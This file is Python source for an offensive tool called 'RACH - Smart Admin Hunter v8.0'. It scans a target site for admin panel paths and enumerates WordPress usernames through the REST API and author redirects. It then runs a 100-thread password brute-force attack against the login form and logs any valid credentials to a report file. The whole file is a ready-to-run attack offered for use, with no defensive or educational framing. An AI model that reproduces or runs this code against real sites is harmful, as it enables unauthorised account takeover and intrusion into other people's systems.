import requests
import sys
import os
import time
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ألوان
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Connection": "keep-alive"
}

ADMIN_PATHS = ["/admin", "/wp-admin", "/login", "/administrator", "/cpanel", "/wp-login.php", "/login.php"]

def banner():
    print(f"""{RED}
    ██████╗  █████╗  ██████╗██╗  ██╗
    ██╔══██╗██╔══██╗██╔════╝██║  ██║
    ██████╔╝███████║██║     ███████║
    ██╔══██╗██╔══██║██║     ██╔══██║
    ██║  ██║██║  ██║╚██████╗██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    {RESET}""")
    print(f"{YELLOW}[*] RACH - Smart Admin Hunter v8.0{RESET}")
    print("-" * 50)

def enumerate_users(url):
    print(f"\n{BLUE}[*] Step 2: Enumerating Users...{RESET}")
    users = []
    # 1. REST API
    try:
        api_url = url.rstrip('/') + "/wp-json/wp/v2/users"
        res = requests.get(api_url, timeout=3, verify=False, headers=HEADERS)
        if res.status_code == 200:
            data = res.json()
            for user in data:
                slug = user.get('slug')
                if slug:
                    users.append(slug)
                    print(f"{GREEN}[+] User Found (API): {slug}{RESET}")
    except:
        pass

    # 2. ?author=1
    if not users:
        for i in range(1, 6):
            try:
                test_url = url.rstrip('/') + f"/?author={i}"
                res = requests.get(test_url, timeout=3, verify=False, allow_redirects=True, headers=HEADERS)
                if res.status_code == 200 and "/author/" in res.url:
                    slug = res.url.split("/author/")[1].strip("/")
                    if slug not in users:
                        users.append(slug)
                        print(f"{GREEN}[+] User Found (Author): {slug}{RESET}")
            except:
                pass

    if not users:
        print(f"{RED}[-] No users found. Using default list.{RESET}")
        users = ["admin", "root", "administrator"]
    return users

def find_admin_panel(url):
    print(f"\n{BLUE}[*] Step 1: Searching for Admin Panel...{RESET}")
    found = []
    def check(path):
        try:
            res = requests.get(url.rstrip('/') + path, timeout=3, allow_redirects=False, verify=False, headers=HEADERS)
            if res.status_code in [200, 401, 403]:
                print(f"{GREEN}[+] Found: {url}{path} (HTTP {res.status_code}){RESET}")
                found.append(url.rstrip('/') + path)
        except:
            pass
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check, ADMIN_PATHS)
        
    if not found:
        print(f"{RED}[-] No admin panel found.{RESET}")
    return found

def brute_force(admin_url, users, wordlist_file):
    print(f"\n{BLUE}[*] Step 3: Brute Forcing Admin Panel (Ultra Fast)...{RESET}")
    if not os.path.exists(wordlist_file):
        print(f"{RED}[!] Wordlist not found.{RESET}")
        return
    
    try:
        with open(wordlist_file, "r", errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except:
        print(f"{RED}[!] Error reading wordlist.{RESET}")
        return

    found = {"status": False, "count": 0}
    total = len(users) * len(passwords)
    start_time = time.time()

    def try_login(user, pwd):
        if found["status"]:
            return
        try:
            data = {"log": user, "pwd": pwd}
            res = requests.post(admin_url, data=data, timeout=3, verify=False, allow_redirects=False, headers=HEADERS)
            if res.status_code == 302 or "dashboard" in res.text.lower():
                print(f"\n{GREEN}[+] SUCCESS! Credentials: {user}:{pwd}{RESET}")
                with open("report.txt", "a") as f:
                    f.write(f"[SUCCESS] {admin_url} - {user}:{pwd}\n")
                found["status"] = True
        except:
            pass
        finally:
            found["count"] += 1
            if found["count"] % 100 == 0:
                elapsed = time.time() - start_time
                speed = found["count"] / elapsed if elapsed > 0 else 0
                print(f"{YELLOW}[*] Tried: {found['count']}/{total} | Speed: {speed:.0f}/s{RESET}", end='\r')

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        for user in users:
            for pwd in passwords:
                if found["status"]:
                    break
                futures.append(executor.submit(try_login, user, pwd))
        
        for future in futures:
            future.result()
            if found["status"]:
                break

    if not found["status"]:
        print(f"\n{RED}[-] No valid credentials found.{RESET}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"{YELLOW}Usage: python rach_admin_v8.py <url> <wordlist>{RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    wordlist = sys.argv[2]
    
    banner()
    print(f"{GREEN}[*] Targeting: {target}{RESET}")
    
    try:
        admin_panels = find_admin_panel(target)
        if not admin_panels:
            sys.exit(0)
        
        users = enumerate_users(target)
        print(f"\n{YELLOW}[*] Total Users to try: {len(users)}{RESET}")
        
        brute_force(admin_panels[0], users, wordlist)
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Stopped by user. Exiting...{RESET}")
        os._exit(1)
    except Exception as e:
        print(f"\n{RED}[!] Error: {e}{RESET}")
        os._exit(1)
